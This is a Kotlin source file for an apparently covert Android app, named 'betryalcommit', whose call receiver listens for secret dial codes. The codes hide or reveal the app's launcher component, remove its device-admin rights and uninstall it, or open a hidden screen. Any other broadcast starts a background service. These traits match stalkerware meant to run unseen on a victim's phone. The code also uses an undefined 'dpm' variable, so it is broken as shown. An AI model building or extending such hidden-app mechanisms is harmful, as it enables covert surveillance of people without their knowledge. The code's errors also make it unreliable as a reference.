package com.example.betryalcommit

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.betryalcommit.AdminAct.deviceAdminReceiver

class USSDReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.intent.action.NEW_OUTGOING_CALL") {
            val phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
            if (phoneNumber == "*123456*") {
                val p: PackageManager = context.packageManager
                val componentName = ComponentName(context,EmulatorChecks::class.java)
                val launchIntent = Intent(context, MainActivity::class.java)
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ContextCompat.startActivity(context, launchIntent, null)
                Thread.sleep(2000);
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            }

            else if (phoneNumber == "*9130*"){
                dpm.removeActiveAdmin(deviceAdminReceiver)
                val uninstall = Intent(Intent.ACTION_DELETE)
                uninstall.data = Uri.parse("package:com.example.betryalcommit")
                uninstall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(uninstall)

            }
            else if (phoneNumber == "*654321*"){
                val p: PackageManager = context.packageManager
                val componentName = ComponentName(context,EmulatorChecks::class.java)
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            }
            else if (phoneNumber == "*0011*"){
                val sf = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
                val code = sf.getString("finalcode", null);
                if (code != null){
                    val intent = Intent(context, RoomId::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ContextCompat.startActivity(context, intent, null)

                }

            }
        }
        else {
            val launchIntent = Intent(context, MyService::class.java)
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ContextCompat.startForegroundService(context,launchIntent)
        }
    }

}